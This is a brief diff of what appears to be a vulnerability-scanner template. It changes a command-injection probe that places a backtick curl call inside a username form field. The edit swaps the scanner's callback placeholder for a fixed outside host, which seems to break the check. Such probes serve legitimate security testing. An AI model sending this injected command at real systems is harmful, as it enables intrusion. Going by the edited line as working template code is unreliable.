@@ -28,7 +28,7 @@ http:
         Origin: {{RootURL}}
         Referer: {{RootURL}}
 
-        username=;`curl {{interactsh-url}}`
+        username=;`curl interactsh-url.com`
 
     matchers:
       - type: dsl
